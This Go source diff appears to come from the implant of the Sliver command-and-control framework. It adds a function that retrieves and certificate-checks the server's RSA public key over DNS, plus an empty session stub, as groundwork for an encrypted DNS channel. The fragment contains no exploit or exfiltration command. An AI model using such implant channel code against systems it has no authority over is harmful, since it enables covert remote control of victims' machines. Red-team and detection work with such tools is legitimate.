@@ -1,8 +1,11 @@
 package main
 
 import (
+	"crypto/rsa"
+	"crypto/x509"
 	"encoding/base64"
 	"encoding/binary"
+	"encoding/pem"
 	"errors"
 	"fmt"
 	"log"
@@ -37,6 +40,38 @@ const (
 var (
 	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")
 )
+
+func dnsStartSession() {
+
+}
+
+func dnsGetServerPublicKey() *rsa.PublicKey {
+	pubKeyPEM, err := LookupDomainKey(sliverName, dnsParent)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to fetch domain key %v", err)
+		// {{end}}
+		return nil
+	}
+
+	pubKeyBlock, _ := pem.Decode([]byte(pubKeyPEM))
+	if pubKeyBlock == nil {
+		// {{if .Debug}}
+		log.Printf("failed to parse certificate PEM")
+		// {{end}}
+		return nil
+	}
+
+	err = rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
+	if err == nil {
+		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
+		return cert.PublicKey.(*rsa.PublicKey)
+	}
+	// {{if .Debug}}
+	log.Printf("Invalid certificate %v", err)
+	// {{end}}
+	return nil
+}
 
 // LookupDomainKey - Attempt to get the server's RSA public key
 func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
